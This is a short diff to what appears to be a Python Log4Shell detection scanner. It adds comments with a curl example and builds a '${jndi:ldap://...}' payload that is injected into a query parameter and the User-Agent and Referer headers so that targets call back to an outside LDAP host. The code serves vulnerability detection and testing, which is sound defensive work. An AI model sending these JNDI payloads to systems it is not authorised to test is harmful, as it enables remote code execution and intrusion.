@@ -10,6 +10,10 @@ proxies = {}
 
 def sendDetectionRequest(url, urlId):
     try:
+        # log4j payload by lunasec
+        # curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
+        # The vulnerable instance of log4j running on port 8080 and the nc lister is placed on port 80
+        # John Hammond Explanation: https://youtu.be/7qoPDq41xhQ?t=377
         payload = '${jndi:ldap://' + str(urlId) + '.' + argv[2] + '/a}'
         params = {'id':payload}
         headers = {'User-Agent':payload, 'Referer':payload}
